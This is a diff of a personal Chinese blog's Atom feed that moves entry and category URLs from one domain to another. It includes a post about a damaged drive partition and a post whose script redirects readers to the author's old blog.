+    <link href="http://0x48.pw/2015/07/19/0x01/"/>
+    <id>http://0x48.pw/2015/07/19/0x01/</id>
     <published>2015-07-18T17:17:46.000Z</published>
-    <updated>2015-07-19T14:45:11.000Z</updated>
+    <updated>2015-07-19T14:45:11.829Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/jian.jpg" alt="图片"><br><a id="more"></a></p>
 <h2 id="起因">起因</h2><p>  强行拔移动硬盘。导致分区损坏。无法挂载。</p>
 <hr>
@@ -828,18 +831,18 @@
     
     </summary>
     
-      <category term="检讨" scheme="http://lazysheep.cc/tags/%E6%A3%80%E8%AE%A8/"/>
+      <category term="检讨" scheme="http://0x48.pw/tags/%E6%A3%80%E8%AE%A8/"/>
     
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[跳转到以前的博文]]></title>
-    <link href="http://lazysheep.cc/2015/07/19/0x00/"/>
-    <id>http://lazysheep.cc/2015/07/19/0x00/</id>
+    <link href="http://0x48.pw/2015/07/19/0x00/"/>
+    <id>http://0x48.pw/2015/07/19/0x00/</id>
     <published>2015-07-18T17:17:45.000Z</published>
-    <updated>2015-07-19T14:45:06.000Z</updated>
+    <updated>2015-07-19T14:45:06.461Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/jump.png" alt="jump"><br><a id="more"></a></p>
 <script>window.location.href="http://old.lazysheep.cc"</script>
 ]]></content>
@@ -848,9 +851,9 @@
     
     </summary>
     
-      <category term="Old博文" scheme="http://lazysheep.cc/tags/Old%E5%8D%9A%E6%96%87/"/>
+      <category term="Old博文" scheme="http://0x48.pw/tags/Old%E5%8D%9A%E6%96%87/"/>
     
-      <category term="R-porter" scheme="http://lazysheep.cc/categories/R-porter/"/>
+      <category term="R-porter" scheme="http://0x48.pw/categories/R-porter/"/>
     
   </entry>
   
